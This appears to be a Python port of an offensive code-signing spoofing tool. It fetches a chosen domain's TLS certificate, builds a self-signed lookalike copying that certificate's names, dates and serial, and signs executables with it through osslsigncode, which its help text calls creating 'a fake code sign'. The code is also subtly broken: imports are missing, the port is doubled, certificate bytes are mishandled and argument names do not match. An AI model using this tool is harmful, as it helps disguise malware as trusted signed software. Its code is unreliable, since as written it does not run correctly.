import os
import subprocess
import ssl
import random
import string
import time
import datetime
from cryptography import x509
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

class FlagOptions:
    def __init__(self, outFile, inputFile, domain, password, real, verify):
        self.outFile = outFile
        self.inputFile = inputFile
        self.domain = domain
        self.password = password
        self.real = real
        self.verify = verify

debugging = False
debugWriter = None

def printDebug(format, *args):
    if debugging:
        output = "[DEBUG] " + format % args
        debugWriter.write(output)

letters = string.ascii_letters + string.digits

def VarNumberLength(min, max):
    num = random.randint(min, max)
    return RandStringBytes(num)

def RandStringBytes(n):
    return ''.join(random.choice(letters) for i in range(n))

def GenerateCert(domain, inputFile):
    rootKey = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    certs, err = GetCertificatesPEM(domain + ":443")
    if err != None:
        os.chdir("..")
        foldername = inputFile.split(".")
        os.rmdir(foldername[0])
        raise Exception("Error: The domain: " + domain + " does not exist or is not accessible from the host you are compiling on")
    block = x509.load_pem_x509_certificate(certs.encode(), default_backend())
    cert = x509.load_pem_x509_certificate(certs.encode(), default_backend())

    keyToFile(domain+".key", rootKey)

    SubjectTemplate = x509.CertificateBuilder().subject_name(x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value)
    ])).issuer_name(x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value)
    ])).not_valid_before(cert.not_valid_before).not_valid_after(cert.not_valid_after).serial_number(cert.serial_number).public_key(rootKey.public_key()).add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True).add_extension(x509.KeyUsage(digital_signature=True, key_cert_sign=True, key_encipherment=True, content_commitment=True, data_encipherment=True), critical=True).add_extension(x509.ExtendedKeyUsage([x509.ExtendedKeyUsageOID.SERVER_AUTH, x509.ExtendedKeyUsageOID.CLIENT_AUTH]), critical=True).sign(rootKey, hashes.SHA256(), default_backend())
    IssuerTemplate = x509.CertificateBuilder().subject_name(x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value)
    ])).not_valid_before(cert.not_valid_before).not_valid_after(cert.not_valid_after).serial_number(cert.serial_number).public_key(cert.public_key()).add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True).add_extension(x509.KeyUsage(digital_signature=True, key_cert_sign=True, key_encipherment=True, content_commitment=True, data_encipherment=True), critical=True).add_extension(x509.ExtendedKeyUsage([x509.ExtendedKeyUsageOID.SERVER_AUTH, x509.ExtendedKeyUsageOID.CLIENT_AUTH]), critical=True).sign(rootKey, hashes.SHA256(), default_backend())
    derBytes = SubjectTemplate.public_bytes(serialization.Encoding.DER)
    certToFile(domain+".pem", derBytes)

def keyToFile(filename, key):
    with open(filename, "wb") as file:
        file.write(key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption()))

def certToFile(filename, derBytes):
    with open(filename, "wb") as file:
        file.write(derBytes)

def GetCertificatesPEM(address):
    conn = ssl.create_connection((address, 443))
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    sock = context.wrap_socket(conn, server_hostname=address)
    certs = sock.getpeercert(True)
    sock.close()
    b = b""
    for cert in certs:
        b += cert[1]
    return b.decode(), None

def GeneratePFK(password, domain):
    cmd = ["openssl", "pkcs12", "-export", "-out", domain+".pfx", "-inkey", domain+".key", "-in", domain+".pem", "-passin", "pass:"+password+"", "-passout", "pass:"+password+""]
    subprocess.run(cmd, check=True)

def SignExecutable(password, pfx, filein, fileout):
    cmd = ["osslsigncode", "sign", "-pkcs12", pfx, "-in", filein, "-out", fileout, "-pass", password]
    subprocess.run(cmd, check=True)

def Check(check):
    cmd = ["osslsigncode", "verify", check]
    subprocess.run(cmd, check=True)

def options():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-O", help="Signed file name")
    parser.add_argument("-I", help="Unsigned file name to be signed")
    parser.add_argument("-Domain", help="Domain you want to create a fake code sign for")
    parser.add_argument("-Password", help="Password for real certificate")
    parser.add_argument("-Real", help="Path to a valid .pfx certificate file")
    parser.add_argument("-Verify", help="Verifies a file's code sign certificate")
    parser.add_argument("-debug", action="store_true", help="Print debug statements")
    args = parser.parse_args()
    global debugging
    global debugWriter
    debugging = args.debug
    debugWriter = open(os.devnull, "w") if not debugging else sys.stdout
    return FlagOptions(args.outFile, args.inputFile, args.domain, args.password, args.real, args.verify)
